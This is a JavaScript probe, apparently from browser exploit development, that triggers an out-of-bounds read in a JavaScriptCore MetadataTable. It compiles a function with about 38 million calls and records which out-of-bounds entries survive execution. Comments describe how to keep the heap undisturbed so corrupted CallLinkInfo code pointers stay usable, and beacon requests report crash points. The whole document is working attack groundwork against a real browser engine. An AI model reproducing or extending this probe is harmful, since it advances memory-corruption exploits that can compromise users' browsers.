// p150g — MetadataTable overflow diagnostic: NO SPRAY
// Tests if OOB metadata entries have valid CallLinkInfo from finishCreation()
// If they do, the function should execute past entry 894 without crash
// Beacon prefix: V150G-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150G-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    if (!window.__bigOk) return;

    // CRITICAL: ZERO heap allocations during callback!
    // Previous probes crashed because XHR beacons in the callback
    // allocated memory that overwrote valid OOB CallLinkInfo data.
    //
    // finishCreation() writes valid CallLinkInfo (including code pointers)
    // to ALL 38M entries, even OOB ones. If we don't disturb the heap,
    // the LLInt should read valid data at OOB entries and execute fine.

    var cnt = 0;
    var BAIL = 2000;

    BS('CALL-BAIL' + BAIL + '-NOBS');

    try {
      window.__bigFn(function() {
        cnt++;
        // NO BEACONS IN HERE — zero allocations!
        if (cnt >= BAIL) throw 'bail';
      });
    } catch(e) {}

    // Only beacon AFTER the call completes (or throws)
    BS('POST-' + cnt);

    // If cnt >= BAIL, we survived 2000 iterations including 1106 OOB entries!
    if (cnt >= BAIL) {
      BS('OOB-SURVIVED-' + (cnt - 893) + '-entries');

      // Second call with beacons to find exactly where things break
      var cnt2 = 0;
      try {
        window.__bigFn(function() {
          cnt2++;
          if (cnt2 === 894) BS('R2-M894');
          if (cnt2 === 1000) BS('R2-M1000');
          if (cnt2 >= 2000) throw 'bail2';
        });
      } catch(e) {}
      BS('R2-POST-' + cnt2);
    } else {
      // Crashed before BAIL — report where
      BS('CRASH-AT-' + cnt);
    }
    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
